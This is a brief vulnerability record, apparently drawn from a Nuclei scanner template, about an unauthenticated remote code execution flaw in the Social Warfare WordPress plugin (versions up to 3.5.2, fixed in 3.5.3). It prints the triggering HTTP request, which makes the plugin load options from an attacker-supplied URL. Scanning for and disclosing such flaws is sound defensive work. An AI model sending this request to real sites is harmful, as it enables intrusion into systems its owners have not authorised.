# Vulnerability: Social Warfare <= 3.5.2 - Remote Code Execution
**Classification:** WORDPRESS
**Source:** Nuclei Template (`wp-social-warfare-rce.yaml`)

## Description
Unauthenticated remote code execution has been discovered in functionality that handles settings import.

## Secure Mitigation
Fixed in version 3.5.3

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-admin/admin-post.php?swp_debug=load_options&swp_url={{path}} HTTP/1.1
Host: {{Hostname}}
```

